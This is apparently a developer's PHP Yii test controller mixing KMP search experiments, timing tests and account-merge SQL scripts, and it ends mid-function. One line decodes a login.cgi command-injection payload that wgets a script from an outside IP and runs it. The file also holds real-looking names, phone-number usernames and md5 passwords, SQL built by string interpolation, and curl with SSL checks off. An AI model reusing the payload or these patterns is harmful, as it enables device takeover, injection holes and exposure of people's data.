<?php

/**
 *
 * @package application.controllers
 */
class TestController extends Controller
{
    // Found all f(s) of the key
    // 在自身串中找前后缀（f(s)） - 目的是为了得到查找算法的实现
    public function foundAllFsOfKey($text)
    {
        // Length
        $n = strlen($text);

        // Make state list
        $sText = [];
        for ($i=0; $i<$n; $i++) {
            $sText[$i+1] = $text[$i];
        }

        // Init the found state result and the pointer
        $fs = [1=>0];
        $t = 0;

        // Same as above which keeps the found sub string using char appending joining
        $fsText = [0=>'', 1=>''];
        $tText = '';

        for ($s=1; $s<$n; $s++) {

            // When a different char is occurred, reset the pointer to f(s) as well as the found sub string
            while ($t>0 && $sText[$s+1] != $sText[$t+1]) {
                $t = $fs[$t];

                $tText = $fsText[$t];
            }

            // Step into when found or end with null
            if ($sText[$s+1] == $sText[$t+1]) {
                $t = $t + 1;
                $fs[$s+1] = $t;

                $tText = $tText . $sText[$t];
                $fsText[$s+1] = $tText;
            } else {
                $fs[$s+1] = 0;

                $tText = '';
                $fsText[$s+1] = $tText;
            }
        }

        \D::pd(array($n, $fs, $fsText));
    }

    // Found key from string
    // 在给定串中找目标串 - 目的是将查找（f(s)）的算法应用到单个关键词查找中
    public function foundKeyFromString($text, $string)
    {
        $m = strlen($string);
        $n = strlen($text);

        $iText = [];
        for ($i=0; $i<$m; $i++) {
            $iText[$i+1] = $string[$i];
        }

        $sTextList = [];
        for ($i=0; $i<$n; $i++) {
            $sTextList[$i+1] = $text[$i];
        }

        //\D::pde($iText, $sTextList);

        /*
        s = 0;
        for (i=1; i<=m; i++) {
            while (s>0 && ai !=bs+1)
                s = f(s);

            if (ai == bs+1)
                s = s + 1;

            if (s == n )
                return 'yes';
        }
        return 'no';
        */

        $fs = [1=>0];
        $s = 0;

        $fsText = [0=>'', 1=>''];
        $sText = '';

        $found = false;

        for ($i=1; $i<=$m; $i++) {

            while ($s>0 && $iText[$i] != $sTextList[$s+1]) {
                $s = $fs[$s];

                $sText = $fsText[$s];
            }

            $mark = 'mark'.'-'.$i.'-'.$iText[$i].'-'.$s.'-'.$sTextList[$s+1].'-';

            if ($iText[$i] != $sTextList[$s+1]) {
                $mark .= 'unmatched';
            }

            if ($iText[$i] == $sTextList[$s+1]) {
                $s = $s + 1;
                $fs[$s+1] = $s;

                $sText = $sText . $sTextList[$s];
                $fsText[$s+1] = $sText;

                $mark .= 'matched';
            }

            \D::pd($mark);

            if ($s == $n) {
                $found = true;
                \D::pd('breaked at '.$i);
                break;
            }
        }

        \D::pd($found);
        \D::pd(array($n, $fs, $fsText));
    }

    // 扩展目标串查找算法，使得可以同时查找多个目标串
    public function foundMultiKeysFromString()
    {
        
    }

    public function actionIndex()
    {

        $a = 10000;
        $b = 0.1;

        $data = [];

        $i = 1;
        while ($a > 0) {

            $row = [];
            $row['i'] = $i;
            $row['a'] = $a;

            $a = $a * (1-$b);
            $row['b'] = $a;

            $data[] = $row;

            if ($i > 150) {
                break;
            }

            $i++;
        }

        $this->view($data);
        
        \D::bk();

        /* test foundAllFsOfKey */

        $s = 'login.cgi?cli=aa%20aa%27;wget%20http://217.61.6.127/t%20-O%20-%3E%20/tmp/t;sh%20/tmp/t%27';
        $d = urldecode($s);
        \D::pdse($d);

        $text = 'abbaabbaabb';
        $fs = $this->foundAllFsOfKey($text);

        $text = 'aaaaaaaaaaa';
        $fs = $this->foundAllFsOfKey($text);

        $text = 'ababababab';
        $fs = $this->foundAllFsOfKey($text);

        $text = 'abbaabbaabb';
        $fs = $this->foundAllFsOfKey($text);

        $text = 'ababaa';
        $fs = $this->foundAllFsOfKey($text);


        /* test foundKeyFromString */

        \D::fp();

        // There is an 'act' before in the middle
        $string = 'abc act bbb';
        $keys = 'act';
        $fs = $this->foundKeyFromString($keys, $string);

        // There is an 'act' before in the middle and also an 'action' at the end
        $string = 'abc act bbb action';
        $keys = 'action';
        $fs = $this->foundKeyFromString($keys, $string);

        // None and more than it
        $string = 'bbbbbbbbbb';
        $keys = 'action';
        $fs = $this->foundKeyFromString($keys, $string);

        // None and less than it
        $string = 'bbb';
        $keys = 'action';
        $fs = $this->foundKeyFromString($keys, $string);

        // Only has the first char in the middle
        // It will be matched, but the entire entry is missed
        $string = 'bbbbabbbbb';
        $keys = 'action';
        $fs = $this->foundKeyFromString($keys, $string);

        // Only has the second char in the middle
        $string = 'bbbbcbbbbb';
        $keys = 'action';
        $fs = $this->foundKeyFromString($keys, $string);


        /* test foundMultiKeysFromString */

        \D::fp();

        \D::bk();


        $one = Goods::model();


        session_start();
        D::post();
        D::session();
        D::pd(Yii::getVersion());
    }

    private function view($data)
    {
        echo '<style>table{width:100%;}</style>';

        $pagination = new CPagination();
        $pagination->setPageSize(10000);

        $dataProvider = new CArrayDataProvider($data);
        $dataProvider->keyField = 'a';
        $dataProvider->setPagination($pagination);
        $this->widget('zii.widgets.grid.CGridView', [
            'dataProvider'=>$dataProvider,
            'enablePagination'=>false,
//            'columns'=>array_merge([
//                    [
//                        'name'=>'Row ID',
//                        'value'=>'$row+1',
//                    ]
//                ], array_keys(reset($data))
//            ),
        ]);
    }

    public function actionP()
    {
        ini_set("max_execution_time", 0);

        $this->time('one');
        //$this->readfile();
        $this->time('one');


        $this->time('one');
        //$this->querydb();
        $this->time('one');

        $this->time('one');
        $this->bignum();
        $this->time('one');
    }

    public function bignum()
    {
        // 对于耗时功能，由于调用方未必会调用后又主动提出请求终止运算，
        // 因此应该总是设置超时检测，避免因为用户调用导致系统资源耗尽.
        // 用户和功能在耗时方面应该总是有一定的约定.
        // 例如，假设一个批量导入程序在数据量10万的情况下耗时大约5分钟，则应该提醒用户需要这样的时间，由用户决定是否执行.
        // 当用户确定执行时，该功能实现应该设置该最大执行时间，超过则终止程序报系统错误.
        // 实际测试预留的时间要足够长，例如测试大约需要2分钟的，可以设置功能最大时间在5分钟.
        $max_time = 10;
        $start = time();

        $max = 1000 * 1000 * 1000;
        while ($max){
            $c = 1024.01*1024.02*1024.0345;
            $c = $c*$c;
            $max--;

            if (time() - $start > $max_time){
                \D::pds('exclude max excute time');
                break;
            }
        }
    }

    public function querydb()
    {
        $max = 100000;
        while ($max){
            $sql = "SELECT * FROM users";
            $c = Yii::app()->db->createCommand($sql);
            $res = $c->queryAll();
            $max--;
        }
    }

    public function readfile()
    {
        $file = Yii::app()->getRuntimePath() . '/in.txt';
        $max = 100000;
        while ($max){
            file_get_contents($file);
            $max--;
        }
    }

    private $times = [];
    public function time($name)
    {
        $time = microtime(true);
        if (!isset($this->times[$name])){
            $this->times[$name] = $time;
        }else{
            \D::pd($time - $this->times[$name]);
            unset($this->times[$name]);
        }
    }

    public function actionPage()
    {
        $this->render('page');
    }

    public function actionIframe()
    {
        $this->render('iframe');
    }

    public function actionPhar()
    {
        D::pde('closed');
        $phar = new Phar('D:/phpunit.phar');
        D::pd('Begin');
        $phar->extractTo('D:/php/projects/yiitest/phpunit-src');
        D::pde('Done');
    }

    public function actionSocket()
    {
        D::bk();

        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        $con=socket_connect($socket,'127.0.0.1', 7379);
        if(!$con)
        {
            socket_close($socket);
            D::pde('can not connect');
        }
        echo "Link\n";

        D::pd($con);


        //while($con)
        {
            //$hear=socket_read($socket, 1024);
            //echo $hear;
            //$words=fgets(STDIN);
            $words = 'test';
            socket_write($socket,$words);
            //if($words=="bye\r\n"){
                //break;
            //}
        }
        socket_shutdown($socket);
        socket_close($socket);
    }

    public function actionRedis()
    {
        $redis = new Redis();
        $redis->connect('127.0.0.1', '7379');
        $key = 'yiitest';
        $set = $redis->set($key, 'test');
        $get = $redis->get($key);
        if (isset($_GET['del'])){
            $redis->del($key);
        }
        \D::pd($redis, $set, $get);
    }

    public function actionBigParam()
    {
        $id = Yii::app()->request->getPost('id');

        $valid = Yii::app()->request->getPost('valid');
        if ($valid){
            $len = strlen($id);
            if ($len == 0 || $len > 5){
                exit('id参数不能为空，且至多5个字符');
            }
        }

        $file = Yii::app()->getRuntimePath() . '/id.txt';
        file_put_contents($file, $id);

        $id = (int)$id;

        $sql = "SELECT * FROM ar_test WHERE artId = '{$id}'";
        $c = Yii::app()->db->createCommand($sql);
        $r = $c->queryRow();
        \D::pds($r);

        exit('done!');
    }

    public function actionValidate()
    {
        $data = [
            'token'=>md5('hello'),
            'data'=>[
                'openid'=>md5('ddd'),
                'sn'=>md5('sn'),
                'price'=>5000,
                'prd_list'=>[
                    [
                        'id'=>123,
                        'name'=>'iphone',
                        'price'=>3000,
                    ],
                    [
                        'id'=>345,
                        'name'=>'xxxx',
                        'price'=>2000,
                    ],
                ],
            ],
        ];
        echo json_encode($data);
    }

    public function actionTestMaxNumber()
    {
        \D::pd(pow(2, 16));
        \D::pd(pow(2, 32));
        \D::pd(pow(2, 64));

        $t = Yii::app()->db->schema->getTables();
        \D::logc($t);

        \D::bk();
        for ($i=0; $i<500; $i++){
            $name = 'name'.rand();
            $sql = "INSERT INTO test_max_number(name) VALUES('{$name}')";
            $c = Yii::app()->db->createCommand($sql);
            $r = $c->execute();
        }
    }


    public function request($url, $postData=[], $post=0)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
        curl_setopt($ch, CURLOPT_POST, $post);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $return = curl_exec($ch);
        curl_close($ch);
        return $return;
    }

    public function actionRequest()
    {
        $max = 20;
        $url = 'http://120.24.158.114:8000/hi.php';

        while ($max){
            $res = $this->request($url);
            \D::log($res);
            sleep(1);
            $max--;
        }
    }

    public function actionUser()
    {
        $b2b = Yii::app()->request->getQuery('b2b');
        $result = Yii::app()->request->getQuery('result');
        if ($result){
            $table = 'main_user_copy';
        }else{
            $table = 'main_user';
        }


        $file = 'D:\tmp\2.txt';
        $file = 'D:\tmp\4.txt';
        $c = file_get_contents($file);
        $list = explode("\n", $c);
        foreach ($list as $index => $value){
            $list[$index] = trim($value);
        }
        $list_all = $list;
        $list = array_unique($list);
        \D::pd($list_all, $list, array_diff($list_all, $list));

        // 查找所有记录
        $in = " IN ('".implode("','", $list)."')";
        \D::pd($in);

        $columns = "a.uid, a.username, a.realname, a.phone, a.is_master, a.master_uid, a.openid";
        if ($b2b){
            $database = 'ismondb2b';
        }else{
            $database = 'platform';
            $columns .= ", a.password";
        }
        $columns .= ", b.uid AS m_uid, b.username AS m_username, b.realname AS m_realname, b.phone AS m_phone, b.is_master AS m_is_master, b.master_uid AS m_master_uid, b.openid AS m_openid";
        if (!$b2b){
            $columns .= ", b.password AS m_password";
        }
        $columns .= ", (a.openid = b.openid) AS equal_openid";
        $columns .= ", (a.uid = b.uid) AS equal_uid";
        $columns .= ", (a.realname = b.realname) AS equal_realname";
        $columns .= ", (a.phone = b.phone) AS equal_phone";
        $sql = "
                SELECT {$columns} 
                FROM {$database}.{$table} AS a 
                  LEFT JOIN {$database}.{$table} AS b 
                    ON b.uid = a.master_uid 
                WHERE a.username {$in} 
                ORDER BY a.master_uid, a.username;";
        \D::pd($sql);
        $select_sql = $sql;
        $res = Yii::app()->db->createCommand($sql)->queryAll();
        \D::pd($res);

        // 找不到的子账号记录
        $found_name = ArrayHelper::getListRowField($res, 'username');
        $missed = array_diff($list, $found_name);
        \D::pd($missed);

        // ----------------
        // 去重、去除主账号之后，对所有已存在子账号更新主账号信息，并删除子账号
        // ----------------

        // 只处理找到的记录 -- 仅限子账号
        $in = " IN ('".implode("','", $found_name)."')";
        \D::pd($in);

        // update
        $sql = "
                UPDATE {$database}.{$table} AS a, 
                        {$database}.{$table} AS b 
                SET b.username = a.username,
                    b.realname = a.realname, ";
        if (!$b2b){
            $sql .= "   b.password = a.password,";
        }

        $sql .= " 
                    b.phone = a.phone 
                WHERE a.username {$in} AND a.is_master = 0 AND b.uid = a.master_uid;
                ";

        // delete
        $sql .= "

                DELETE FROM {$database}.{$table} 
                WHERE username {$in} 
                AND is_master = 0; 
                ";

        $sql .= "\n" . $select_sql;

        if (!$b2b){
        // 查看服务授权结果
        $app_sql = "
                SELECT u.uid AS u_uid, u.username, ua.*, a.*  
                FROM {$database}.main_user AS u 
                    LEFT JOIN {$database}.main_user_apps AS ua 
                        ON ua.uid = u.uid 
                    LEFT JOIN {$database}.main_apps AS a 
                        ON a.id = ua.app_id 
                WHERE u.username {$in} 
                    AND (ua.app_id != 396 or ua.app_id is null);";
        $sql .= "
                $app_sql
                
                ";
        $app_res = Yii::app()->db->createCommand($app_sql)->queryAll();
        \D::pd($app_res);

        // 添加服务授权
        $sql .= "
                INSERT INTO main_user_apps(uid, app_id) VALUES\n";
        $app_res_id = ArrayHelper::getListRowField($app_res, 'u_uid');
        $app_res_id = array_merge($app_res_id, [7952, 8139, 8165, 7917]);


        $app_res_id = [7900,7884,7123,7130,7892,7857,7928,7893,8415,7809,7842,7898,7902,7945,7849,7860,7885,7188,7923,7890,7844,7941,7145,7933,7097,7089,8262,8243,8162,8266,8217,8029,8345,8147,7846,8328,8142,8135,8144,7185,8251,8255,8477,8269,7143,7985,8349,8018,8294,7854,7966,8214,7989,8123,8076,8278,8160,8238,8324,8210,8261,8258,8347,7965,8351,8155,8485,8448,8456,8282,8069,8163,8026,8240,8080,8371,8129,8253,8156];
        foreach ($app_res_id as $uid){
            $sql .= "({$uid}, 396),\n";
        }
        $sql = rtrim($sql, ",\n");
        $sql .= ";\n";
        }
        \D::pd($sql);

        // ----------------
        // 直接更新不存在的子账号所属主账号信息
        // ----------------

        $data = [
            ['username'=>'sfmjyzb', 'realname'=>'肖肖', 'password'=>md5('sfmjyzb'), 'm_openid'=>'b45efdb531ac4150aed72054fe42a435'],
            ['username'=>'lnzghjd', 'realname'=>'陈传军', 'password'=>md5('lnzghjd'), 'm_openid'=>'9eea93fba65ecc293a715b1e5e6a2303'],
            ['username'=>'13508812788', 'realname'=>'庄旭文', 'password'=>md5('812788'), 'm_openid'=>'fe6decd45a6e203934d0613387908980'],
            ['username'=>'13751190833', 'realname'=>'徐军峰', 'password'=>md5('190833'), 'm_openid'=>'8aabe442bb9c341dc937460362a2ad01'],
        ];
        $sql = "\n";
        foreach($data as $row){
            $m_openid = $row['m_openid'];
            unset($row['m_openid']);

            $sql .= "UPDATE {$database}.{$table} SET ";
            foreach ($row as $name => $value){
                $sql .= "{$name}='{$value}',";
            }
            $sql = rtrim($sql, ',');
            $sql .= " WHERE openid='{$m_openid}';\n";
        }
        \D::pd($sql);





        // 结果数据 -- 用于excel表
        $data = [];
        foreach ($res as $index => $row){
            $data[$row['username']] = $row;
        }

        $map = [];
        \D::pd($list_all);
        foreach ($list_all as $name){
            $row = isset($data[$name]) ? $data[$name] : null;
            if ($row !== null){
                $map[] = ['username'=>$name, 'password'=>isset($row['password']) ? $row['password'] : '', 'openid'=>$row['openid'], 'm_username'=>$row['m_username'], 'm_realname'=>$row['m_realname'], 'm_openid'=>$row['m_openid']];
            }else{
                $map[] = ['username'=>$name, 'password'=>'', 'openid'=>'', 'm_username'=>'', 'm_realname'=>'', 'm_openid'=>''];
            }
        }
        \D::pd($map);

        $name_str = "\n";
        $openid_str = "\n";
        $m_openid_str = "\n";
        $m_username_str = "\n";
        $m_realname_str = "\n";
        $password_str = "\n";
        foreach ($map as $row){
            $name_str .= "{$row['username']}\n";
            $openid_str .= "{$row['openid']}\n";
            $m_openid_str .= "{$row['m_openid']}\n";
            $m_username_str .= "{$row['m_username']}\n";
            $m_realname_str .= "{$row['m_realname']}\n";
            $password_str .= "{$row['password']}\n";
        }

        \D::logc();
        \D::log($name_str);
        \D::log($openid_str);
        \D::log($m_openid_str);
        \D::log($m_username_str);
        \D::log($m_realname_str);
        \D::log($password_str);











        $s = '2f4e013ea98d542bffad9b861bc2f97b
83d35590f409f926bf29d2795a27455e
ba147635bb515f5b963dfe178822db91
2eb3f75eb6f4bd1cbdf713151f84069c
8fbca655fc51834fa48a7f788a119c5a
3e2394d96191043d98d7baaa4ddc0d0b
0abfc2b4c900dddc455d1acb98b3d99f
fb038d9a7fb67953442823f53aef3147
c74d2da583e9849e6d6474a9698e6776
7dd6752a1dcc2f2b12363fdeb19e7c6f

fc6d871b5d94aa4f74679712e483a7e4
8ab2a50fc3e0e232c361318f71f3889f
eec645ad80d964c4b3c055e4913e5f60
bd1480c51f017bbf7fff1300d166843e
3e2394d96191043d98d7baaa4ddc0d0b
ace0821e28087692d16a1983b1d2914f
d80590d2856bae9d146c38a480088061
ecbe445ab2961cd611db9721a05b86ab
75224613b1af217039bdb0058f44491a
f3b572c2953a5222806745f292f53e21
ab195b411ace35be5fe91fdc0e92b65b
d285f04fca6b2f4458caddb439ecdcf1
6d871f5f2bda814ecc42a056ce4f6ad6
d3981793078b9a96e872f70c74e46bff
3135c3e0023a49cddf4fc69da172cadf
1a09573494dc2a20d2d27c433fa6823b
4a335d19311c039f2cc60bbb779d4e09
a746e8a42cb3ce663ec7ee47028b38f7
5a0eb190b4df82a3af71d1d60713f8fe
09668002aea48447df7405483e766e76
f28e22aaac01bf3045e6e9cd438805b3
b0e6a598d522040275b22b88894f12b1
6af47808d4bdb068e8b0fda3fdee3578
c8239d39bbd25abdf827b9625c95964f
0c227be12d0f640a0a2608100dd8a582
b50258dc3417afda3756e729c7fcf171
d131373fd3efaca3502d5a6c06f14c10
aa608020d0392d88227159f56a015b79
02685fb75f25989d9dea3e96c9a7f8d4
9e435dbc3d5b9ad786fd86337818ac5d
ad7fd8f114f86464e3bebce434f76514
3c77221f287d7eab0e99dc0d5931b490
5c633bfe3cd2999879de70d4f80314a7

af01629004999445dbd04d0b441ab593
7ab0559177b5385b61d71296326f52cf
0cddacc3a3455d1fca716668bab684a2
c911c0d9b0439b1fe5ec420d2c6bdac7
3135c3e0023a49cddf4fc69da172cadf
ab15ef2d1183e96e631199f649022ac1
08a618412cab49c40a23bd53b3516b5d

c894cbfa62c701fc6b125094f3a94fe9
4a335d19311c039f2cc60bbb779d4e09
a746e8a42cb3ce663ec7ee47028b38f7
9c6e4033c9eda18a2dd35bb93cae93b5
f28e22aaac01bf3045e6e9cd438805b3
34480991631d24510b08c6db113f59ed


82a4233df8120d1e6d41d8a3b36424ac
c72dc6a5dfdb7199571db0433d0b078e
566a6ed0bde749edd6a4407acd2d6cd1
d82ac4b69bd245b3aa73e1e283c0a89c
d0f49175225e68a1b9083dd36c591185
fd9ab6a8cb81b1b1e282042feb12f05a
98aaf38ab509ea2318cb0c72cdb0cba6
ffa9d1b7c39a9a56fe67956284a98569
5c85b519e9879150fc5215970103a9dd
61e3cd8cd6f5b6009e170f8927b8eb86
49457127f046a3a5caf06bcdaf13b97e
193fee706554a58026f288caac806111

c36e5a754448e8b5b010ab1c8d313012
64fef80739ef547e6381d4ccd6089db4
ba5376377719208ba8591e9730607e4d
9fa14d7c7b1761f7902071bcc573cf9f
296fee13b8773d6ef2455592aa4f2b82
49fd084135c542c6c8c4e2613051f046
6597d34cf3ef5dc9264b5dabd358e1ec
a205a95bcc4032ba8222c22e888bf5a4
8486b852d0f5a6ecdcbc16d9df15d90c
d37d00a4ed2baa032f69ad362852ee18
2d1473023e97954f50a026b4c328d997
e7a4b53a063f4343b6cfbe3edcf1c063
c8239d39bbd25abdf827b9625c95964f
8a522c5fe344ae0fb745fc30f5507c83
82f8a1f9e98e2992b5543f1af16e1e93
2b1304f4784ae262a0ea0f18549bb5f4
936c037d588497d3c66d78e1423a3414
9d6734bb99a1aca39c4e19fcae32ac8b';

        $s = '2f4e013ea98d542bffad9b861bc2f97b
83d35590f409f926bf29d2795a27455e
ba147635bb515f5b963dfe178822db91
2eb3f75eb6f4bd1cbdf713151f84069c
8fbca655fc51834fa48a7f788a119c5a
3e2394d96191043d98d7baaa4ddc0d0b
0abfc2b4c900dddc455d1acb98b3d99f
fb038d9a7fb67953442823f53aef3147
c74d2da583e9849e6d6474a9698e6776
7dd6752a1dcc2f2b12363fdeb19e7c6f

fc6d871b5d94aa4f74679712e483a7e4
8ab2a50fc3e0e232c361318f71f3889f
eec645ad80d964c4b3c055e4913e5f60
bd1480c51f017bbf7fff1300d166843e
ace0821e28087692d16a1983b1d2914f
d80590d2856bae9d146c38a480088061
ecbe445ab2961cd611db9721a05b86ab
75224613b1af217039bdb0058f44491a
f3b572c2953a5222806745f292f53e21
ab195b411ace35be5fe91fdc0e92b65b
d285f04fca6b2f4458caddb439ecdcf1
6d871f5f2bda814ecc42a056ce4f6ad6
d3981793078b9a96e872f70c74e46bff
3135c3e0023a49cddf4fc69da172cadf
1a09573494dc2a20d2d27c433fa6823b
4a335d19311c039f2cc60bbb779d4e09
a746e8a42cb3ce663ec7ee47028b38f7
5a0eb190b4df82a3af71d1d60713f8fe
09668002aea48447df7405483e766e76
f28e22aaac01bf3045e6e9cd438805b3
b0e6a598d522040275b22b88894f12b1
6af47808d4bdb068e8b0fda3fdee3578
c8239d39bbd25abdf827b9625c95964f
0c227be12d0f640a0a2608100dd8a582
b50258dc3417afda3756e729c7fcf171
d131373fd3efaca3502d5a6c06f14c10
aa608020d0392d88227159f56a015b79
02685fb75f25989d9dea3e96c9a7f8d4
9e435dbc3d5b9ad786fd86337818ac5d
ad7fd8f114f86464e3bebce434f76514
3c77221f287d7eab0e99dc0d5931b490
5c633bfe3cd2999879de70d4f80314a7

af01629004999445dbd04d0b441ab593
7ab0559177b5385b61d71296326f52cf
0cddacc3a3455d1fca716668bab684a2
c911c0d9b0439b1fe5ec420d2c6bdac7
ab15ef2d1183e96e631199f649022ac1
08a618412cab49c40a23bd53b3516b5d
c894cbfa62c701fc6b125094f3a94fe9
9c6e4033c9eda18a2dd35bb93cae93b5
34480991631d24510b08c6db113f59ed

9c0c1469176f28dc58c0be44e82c7894
82a4233df8120d1e6d41d8a3b36424ac
c72dc6a5dfdb7199571db0433d0b078e
566a6ed0bde749edd6a4407acd2d6cd1
d82ac4b69bd245b3aa73e1e283c0a89c
d0f49175225e68a1b9083dd36c591185
fd9ab6a8cb81b1b1e282042feb12f05a
98aaf38ab509ea2318cb0c72cdb0cba6
ffa9d1b7c39a9a56fe67956284a98569
5c85b519e9879150fc5215970103a9dd
61e3cd8cd6f5b6009e170f8927b8eb86
49457127f046a3a5caf06bcdaf13b97e
193fee706554a58026f288caac806111

c36e5a754448e8b5b010ab1c8d313012
64fef80739ef547e6381d4ccd6089db4
ba5376377719208ba8591e9730607e4d
9fa14d7c7b1761f7902071bcc573cf9f
296fee13b8773d6ef2455592aa4f2b82
49fd084135c542c6c8c4e2613051f046
6597d34cf3ef5dc9264b5dabd358e1ec
a205a95bcc4032ba8222c22e888bf5a4
8486b852d0f5a6ecdcbc16d9df15d90c
d37d00a4ed2baa032f69ad362852ee18
2d1473023e97954f50a026b4c328d997
e7a4b53a063f4343b6cfbe3edcf1c063
8a522c5fe344ae0fb745fc30f5507c83
82f8a1f9e98e2992b5543f1af16e1e93
2b1304f4784ae262a0ea0f18549bb5f4
936c037d588497d3c66d78e1423a3414';


        // 统计主账号openid出现数量
        $list = explode("\n", $s);
        $data = [];
        foreach ($list as $value){
            $value = trim($value);
            if ($value == ''){
                continue;
            }

            if (!isset($data[$value])){
                $data[$value] = 1;
            }else{
                $data[$value] += 1;
            }
        }
        \D::pd($data);

        // 出现过2次的主账号openid
        $duplicate = [];
        foreach ($data as $value => $count){
            if ($count != 1){
                $duplicate[$value] = $count;
            }
        }
        \D::pd($duplicate);
    }

    public function actionCircle()
    {
//        $r = 100;
//        $middle_point = [300,300];
//
//        $point_list = [];
//        foreach (range(0, 359) as $angle) {
//            $point_list[] = [$r * sin($angle), $r * cos($angle)];
//        }
//
//        \D::pd($point_list);
//
//        \D::pd(cos(1));
        $this->render('circle');
    }

    public function actionDiff()
    {
        $s = file_get_contents('D:\tmp\seats\1.txt');
        $ss = file_get_contents('D:\tmp\seats\2.txt');

        $d = explode("\n", $s);
        $dd = explode("\n", $ss);

        $diff = $this->diff($d, $dd);
        \D::pd($diff);
    }

    public function diff($d, $dd)
    {
        sort($d);
        sort($dd);

        $len = count($d);
        $len2 = count($dd);

        if ($len > $len2) {
            $large = $d;
            $small = $dd;
        } else {
            $large = $dd;
            $small = $d;
        }

        $diff = [];
        foreach ($large as $item) {
            $item = trim($item);

            if ($item == '') {
                continue;
            }

            $found = false;
            foreach ($small as $value) {
                $value = trim($value);

                if ($value == '') {
                    continue;
                }

                if (strcmp($item, $value) == 0) {
                    $found = true;
                    break;
                }
            }

            if (!$found) {
                $diff[] = $item;
            }
        }

        return $diff;
    }

    /**
     * 十六进制显示大小.
     */
    public function actionHexSize()
    {
        // 范围开始和结束，结束>=开始
        $begin = Yii::app()->request->getQuery('begin');
        $end = Yii::app()->request->getQuery('end');

        // 大写去空格
        $begin = strtoupper(trim($begin));
        $end = strtoupper(trim($end));

        // 验证格式
        $error = $this->validateHex($begin);
        if ($error) {
            exit($error);
        }

        // 验证格式
        $error = $this->validateHex($end);
        if ($error) {
            exit($error);
        }

        $this->getHexSize2($begin, $end);
    }

    public function getHexSize2($begin, $end)
    {
        $beginSize = $this->binaryToSize2($begin);
        $endSize = $this->binaryToSize2($end);
        \D::pd($beginSize, $endSize);

         // 相减：第一个减去第二个
        $minus = $this->minusSize2($endSize, $beginSize);
        \D::pd($minus);

        // 格式化显示
        $beginSize = $this->formatSize2($beginSize);
        $endSize = $this->formatSize2($endSize);
        $minus = $this->formatSize2($minus);
        \D::pd($beginSize, $endSize);
        \D::pd($minus);
    }

    public function minusSize2($endSize, $beginSize)
    {
        $endSize['value'] -= $beginSize['value'];
        return $endSize;
    }

    public function binaryToSize2($string)
    {
        $number = hexdec($string);

        $unit = '';
        $unitMap = [
            '6'=>'E',
            '5'=>'P',
            '4'=>'T',
            '3'=>'G',
            '2'=>'M',
            '1'=>'K',
            '0'=>'',
        ];
        $i = 1;
        while ($number >= 1024) {
            $unit = $unitMap[$i];
            $number = $number / 1024;
            $i++;
        }

        return ['value'=>$number, 'unit'=>$unit];
    }

    public function formatSize2($number)
    {

    }

    public function getHexSize($begin, $end)
    {
        // 转二进制字符串
        $beginBinary = $this->hexToBinary($begin);
        $endBinary = $this->hexToBinary($end);

        // 二进制字符串转大小：分段标识，避免因为整数过大导致溢出
        $beginSize = $this->binaryToSize($beginBinary);
        $endSize = $this->binaryToSize($endBinary);
//        \D::pd($beginSize, $endSize);

        // 相减：第一个减去第二个
        $minus = $this->minusSize($endSize, $beginSize);
//        \D::pd($minus);

        // 格式化显示
        $beginSize = $this->formatSize($beginSize);
        $endSize = $this->formatSize($endSize);
        $minus = $this->formatSize($minus);
//        \D::pd($beginSize, $endSize);
//        \D::pd($minus);
    }

    /**
     * 相减：第一个减去第二个，按对应单位值相减.
     * @param $a
     * @param $b
     * @return mixed
     */
    public function minusSize($a, $b)
    {
        // 取项目数较大的作为第一项
        if (count($a) > count($b)) {
            $first = $a;
            $second = $b;
        } else {
            $first = $b;
            $second = $a;
        }

        // 遍历所有分段
        foreach ($first as $index => $row) {

            // 如果对应分段找不到，不处理
            if (!isset($second[$index])) {
                continue;
            }

            // 对应字段相减，其它信息不变
            $first[$index]['value'] -= $second[$index]['value'];
        }

        return $first;
    }

    /**
     * 格式化显示.
     * @param $data
     * @return string
     */
    public function formatSize($data)
    {
        $res = [];
        foreach ($data as $row) {

            // 每一项直接拼接值和单位
            $res[] = $row['value'] . $row['unit'];
        }

        // 用加号拼接
        $string = implode(' + ', $res);

        // 如果拼接结果等于空串，就表示结果是0
        return $string === '' ? '0' : $string;
    }

    /**
     * 二进制字符串转大小：分段标识，避免因为整数过大导致溢出.
     * @param $string
     * @return array
     */
    public function binaryToSize($string)
    {
        $res = [];

        // 分段标识：索引乘以10表示二进制位数长度，一个长度对应一个单位
        $unitMap = [
            '6'=>'E',
            '5'=>'P',
            '4'=>'T',
            '3'=>'G',
            '2'=>'M',
            '1'=>'K',
            '0'=>'',
        ];

        $len = strlen($string);

        for ($i=6; $i>=0; $i--) {

            // 当前分段的分隔长度
            $section = $i * 10;

            // 如果当前二进制串长度小于分段分隔长度则不处理
            if ($len < $section) {
                continue;
            }

            // 获取分段之前的子串，这一段就是真实想要的数字，转成十进制
            $sub = substr($string, 0, $len - $section);
            $value = bindec($sub);

            // 如果十进制为0，跳过
            if ($value == 0) {
                continue;
            }

            $unit = $unitMap[$i];
            $res[] = [
                'i'=>$i,
                'section'=>$section,
                'len'=>$len,
                'sub'=>$sub,
                'string'=>$string,
                'value'=>$value,
                'unit'=>$unit,
            ];

            // 子串长度
            $subLen = strlen($sub);

            // 用子串做下一个循环
            $string = substr($string, $subLen);

            // 用子串长度
            $len = $len - $subLen;
        }

        return $res;
    }

    /**
     * 十六进制转二进制.
     * @param $string
     * @return string
     */
    public function hexToBinary($string)
    {
        // 跳过开头的0x
        $string = substr($string, 2);

        // 十六进制字符和二进制编码映射表
        $map = $this->getHexBinaryMap();

        $res = '';
        $len = strlen($string);
        for ($i=0; $i<$len; $i++) {

            // 直接取二进制编码拼接
            $res .= $map[$string[$i]];
        }
        return $res;
    }

    /**
     * 验证十六进制格式.
     * @param $string
     * @return null|string
     */
    public function validateHex($string)
    {
        // 十六进制长度至少4个字符
        $len = strlen($string);
        if ($len < 4) {
            return '十六进制长度至少4个字符';
        }

        // 十六进制长度一定是2的倍数
        if ($len % 2 != 0) {
            return '十六进制长度一定是2的倍数';
        }

        // 十六进制以0x开头
